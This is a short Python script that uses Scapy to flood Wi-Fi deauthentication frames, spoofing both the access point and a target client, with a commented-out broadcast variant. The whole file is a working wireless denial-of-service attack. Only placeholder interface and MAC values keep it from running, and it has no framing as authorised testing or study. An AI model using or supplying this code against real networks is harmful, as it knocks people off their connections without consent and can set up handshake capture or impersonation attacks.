import sys
from scapy.all import *
import time
import os
import threading

IFACE_NAME = 'your interface'
network = 'test network'
device = 'test device'

# Define the function to send deauth frames
def send_deauth_frames(network_mac, client_mac, iface):
    # Frame to the network (broadcast deauth)
    #broadcast_deauth = RadioTap() / Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=network_mac, addr3=network_mac) / Dot11Deauth(reason=7)
    #sendp(broadcast_deauth, inter=0.1, count=1000, iface=iface, verbose=1)
    
    # Frame from the network to the client
    network_to_client_deauth = RadioTap() / Dot11(addr1=client_mac, addr2=network_mac, addr3=network_mac) / Dot11Deauth(reason=7)
    sendp(network_to_client_deauth, inter=0.1, count=1000, iface=iface, verbose=1)
    
    # Frame from the client to the network
    client_to_network_deauth = RadioTap() / Dot11(addr1=network_mac, addr2=client_mac, addr3=client_mac) / Dot11Deauth(reason=7)
    sendp(client_to_network_deauth, inter=0.1, count=1000, iface=iface, verbose=1)
    
    print("Deauthentication packets sent.")

# Send the deauth frames
send_deauth_frames(network, device, IFACE_NAME)